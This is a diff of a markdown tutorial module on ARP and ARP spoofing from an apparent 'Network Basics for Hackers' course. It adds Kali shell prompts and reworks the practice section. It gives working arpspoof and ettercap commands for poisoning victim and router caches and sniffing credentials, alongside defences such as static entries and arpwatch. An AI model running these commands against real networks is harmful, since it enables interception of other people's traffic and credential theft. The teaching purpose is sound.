@@ -1,6 +1,11 @@
-# Module 7 - The Identity Thief (ARP)
+# Network Basics for Hackers
+## Module 07 - ARP (Address Resolution Protocol)
 
-> *The protocol that holds local networks together - and has no way to verify anyone is who they say they are.*
+---
+
+## Overview
+
+Address Resolution Protocol (ARP) bridges the gap between Layer 3 logical IP addresses and Layer 2 physical MAC addresses on local broadcast domains. Because ARP was designed without cryptographic authentication or reply verification, systems blindly accept unsolicited ARP frames. This fundamental architectural trust enables ARP poisoning and Man-in-the-Middle (MITM) interception on Ethernet networks.
 
 ---
 
@@ -65,6 +70,8 @@ This is called **ARP Spoofing** (or ARP Poisoning).
 
 The attack is straightforward. The attacker sends fake ARP replies to both the victim and the router, telling each one that the attacker's MAC address belongs to the other's IP.
 
+![ARP Poisoning and Man-in-the-Middle Flow](assets/arp_spoofing_mitm_diagram_1789285502439.jpg)
+
 ```
 Normal traffic flow:
 [Victim 192.168.1.5] <-----------> [Router 192.168.1.1]
@@ -86,7 +93,7 @@ This is a **Man-in-the-Middle attack**. ARP spoofing is the most common way to g
 
 ```bash
 # Show your current ARP cache (IP to MAC mappings)
-arp -a
+ahegazy0@kali:~$ arp -a
 
 # Example output:
 # ? (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0
@@ -103,13 +110,13 @@ If your router's MAC address in the ARP cache suddenly changes to something unex
 
 ```bash
 # Actively scan a subnet
-sudo netdiscover -r 192.168.1.0/24
+ahegazy0@kali:~$ sudo netdiscover -r 192.168.1.0/24
 
 # Passive mode - just listen for ARP traffic, don't send anything
-sudo netdiscover -p
+ahegazy0@kali:~$ sudo netdiscover -p
 
 # Scan a specific interface
-sudo netdiscover -i eth0 -r 192.168.1.0/24
+ahegazy0@kali:~$ sudo netdiscover -i eth0 -r 192.168.1.0/24
 ```
 
 Output gives you IP, MAC, and often a vendor name based on the MAC prefix. That vendor name is useful - it tells you what kind of device you're looking at before you even scan it.
@@ -122,13 +129,13 @@ Output gives you IP, MAC, and often a vendor name based on the MAC prefix. That 
 
 ```bash
 # Enable IP forwarding first (so traffic still flows through you)
-echo 1 > /proc/sys/net/ipv4/ip_forward
+ahegazy0@kali:~$ sudo sysctl -w net.ipv4.ip_forward=1
 
 # Tell the victim that you are the router
-sudo arpspoof -i eth0 -t <victim_IP> <router_IP>
+ahegazy0@kali:~$ sudo arpspoof -i eth0 -t <victim_IP> <router_IP>
 
 # Tell the router that you are the victim (run in a second terminal)
-sudo arpspoof -i eth0 -t <router_IP> <victim_IP>
+ahegazy0@kali:~$ sudo arpspoof -i eth0 -t <router_IP> <victim_IP>
 ```
 
 Both commands need to run at the same time. The first poisons the victim's cache. The second poisons the router's cache. Together they put you in the middle of the traffic flow.
@@ -143,13 +150,13 @@ Ettercap automates the whole process and adds sniffing on top. It handles the AR
 
 ```bash
 # Launch Ettercap in text mode
-sudo ettercap -T -q -i eth0
+ahegazy0@kali:~$ sudo ettercap -T -q -i eth0
 
 # ARP poisoning between two specific hosts
-sudo ettercap -T -M arp:remote /192.168.1.5// /192.168.1.1//
+ahegazy0@kali:~$ sudo ettercap -T -M arp:remote /192.168.1.5// /192.168.1.1//
 
 # With a plugin (like searching for passwords)
-sudo ettercap -T -M arp:remote -P autoadd /192.168.1.5// /192.168.1.1//
+ahegazy0@kali:~$ sudo ettercap -T -M arp:remote -P autoadd /192.168.1.5// /192.168.1.1//
 ```
 
 Ettercap also has a GUI mode if you prefer that. It has built-in plugins for stripping HTTPS, injecting content into traffic, and extracting credentials from cleartext protocols.
@@ -172,10 +179,10 @@ ARP operates at Layer 2 of the OSI model - the Data Link layer. This is importan
 
 ```bash
 # Add a static ARP entry
-sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
+ahegazy0@kali:~$ sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
 
 # View current ARP table
-arp -a
+ahegazy0@kali:~$ arp -a
 ```
 
 The downside is it doesn't scale. You can't manually set static entries for every device on a large network.
@@ -186,8 +193,8 @@ The downside is it doesn't scale. You can't manually set static entries for ever
 
 ```bash
 # Install and run arpwatch
-sudo apt install arpwatch
-sudo arpwatch -i eth0
+ahegazy0@kali:~$ sudo apt install arpwatch
+ahegazy0@kali:~$ sudo arpwatch -i eth0
 ```
 
 ---
@@ -206,33 +213,32 @@ sudo arpwatch -i eth0
 
 ---
 
-## Lab
+## Practice
 
 ```bash
 # 1. Check your ARP cache
-arp -a
-# Find your router's entry - note the MAC address
+ahegazy0@kali:~$ arp -a
 
 # 2. Scan your local network with netdiscover
-sudo netdiscover -r 192.168.1.0/24
-# How many devices do you find? Can you identify what they are by vendor?
+ahegazy0@kali:~$ sudo netdiscover -r 192.168.1.0/24
 
-# 3. Enable IP forwarding and check it's on
-cat /proc/sys/net/ipv4/ip_forward
-# Should show 1 if enabled
+# 3. Enable IP forwarding
+ahegazy0@kali:~$ sudo sysctl -w net.ipv4.ip_forward=1
+ahegazy0@kali:~$ cat /proc/sys/net/ipv4/ip_forward
 
-# 4. Set a static ARP entry for your router (defense practice)
-sudo arp -s 192.168.1.1 <your_router_MAC>
-arp -a
-# Confirm it shows as "PERM" (permanent)
+# 4. Set a static ARP entry for testing
+ahegazy0@kali:~$ sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
+ahegazy0@kali:~$ arp -a
 ```
 
-**Things to think about:**
+- [ ] Inspect your local ARP cache with `arp -a` and note your default gateway's MAC address.
+- [ ] Discover active devices on your subnet using `sudo netdiscover -r <subnet>` and identify hardware vendors from MAC OUIs.
+- [ ] Understand the role of kernel IP forwarding (`net.ipv4.ip_forward`): What happens to the victim if traffic is intercepted without forwarding?
+- [ ] Configure a static ARP entry on Linux and explain why static mapping resists gratuitous ARP spoofing.
+- [ ] Explain why ARP attacks are restricted to local Layer 2 broadcast domains and cannot traverse Layer 3 routed boundaries.
 
-- Why can't you use ARP to attack a machine on a completely different network or subnet?
-- If IP forwarding is disabled during an ARP spoof, what happens to the victim's connection?
-- Your ARP cache shows your router's MAC changed between yesterday and today. What could explain that? Is it always an attack?
+> 💡 *For deeper practice, I also recommend completing the end-of-chapter exercises in the official **Network Basics for Hackers** book.*
 
 ---
 
-*Next: DNS - the protocol that turns domain names into IP addresses, and one of the most abused protocols in all of networking.*
+*Up next: Module 08 - DNS (The Internet's Phonebook)*
